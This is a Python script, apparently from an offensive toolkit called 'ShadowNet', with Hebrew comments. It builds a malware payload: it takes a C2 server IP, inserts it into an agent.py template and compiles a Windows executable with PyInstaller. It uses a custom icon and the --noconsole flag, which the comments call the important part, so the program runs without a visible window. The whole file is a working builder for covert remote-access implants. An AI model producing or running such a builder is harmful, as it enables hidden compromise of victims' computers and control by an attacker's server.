import os
import time
import subprocess
import sys

def build_payload():
    print(r"""
    ======================================
       ShadowNet Payload Generator v2.0
    ======================================
    """)
    
    # 1. קבלת ה-IP מהמשתמש
    lhost = input(" [*] Enter C2 Server IP (LHOST): ")
    if not lhost:
        print(" [!] IP cannot be empty!")
        return

    print(" [*] Reading agent template...")
    
    try:
        # קריאת קובץ המקור
        with open("agent.py", "r") as file:
            data = file.read()
            
        # החלפת הכתובת
        new_agent_code = data.replace("REPLACE_ME_IP", lhost)
        
        # יצירת קובץ זמני
        temp_filename = "agent_built.py"
        with open(temp_filename, "w") as file:
            file.write(new_agent_code)
            
        print(f" [*] Configured agent with IP: {lhost}")
        
        # --- הגדרות בנייה ---
        icon_name = "shadownet.ico"
        exe_name = "ShadowAgent"
        
        # בניית הפקודה הבסיסית
        # --onefile: קובץ אחד
        # --clean: ניקוי קבצי זבל
        # --noconsole: שלא ייפתח חלון שחור! (החלק החשוב)
        base_cmd = f'pyinstaller --onefile --clean --noconsole --name "{exe_name}"'
        
        # אם האייקון קיים, נוסיף אותו
        if os.path.exists(icon_name):
            print(" [*] Icon found! Adding custom icon...")
            cmd = f'{base_cmd} --icon="{icon_name}" "{temp_filename}"'
        else:
            print(" [!] Icon not found (run create_icon.py first). Using default icon.")
            cmd = f'{base_cmd} "{temp_filename}"'
        
        print(" [*] Compiling to EXE... (Please wait)")
        
        # הרצת PyInstaller
        # משתמשים ב-sys.executable כדי לוודא שמשתמשים בפייתון הנכון
        subprocess.check_call([sys.executable, "-m", "PyInstaller"] + cmd.split()[1:])
        
        # ניקיון
        if os.path.exists(temp_filename):
            os.remove(temp_filename)
        if os.path.exists(f"{exe_name}.spec"):
            os.remove(f"{exe_name}.spec")

        print("\n" + "="*40)
        print(f" [V] SUCCESS! Payload generated.")
        print(f" [>] Location: dist/{exe_name}.exe")
        print("="*40)

    except FileNotFoundError:
        print(" [!] Error: 'agent.py' not found.")
    except subprocess.CalledProcessError:
        print(" [!] Error during PyInstaller compilation.")
    except Exception as e:
        print(f" [!] Unexpected Error: {e}")

if __name__ == "__main__":
    build_payload()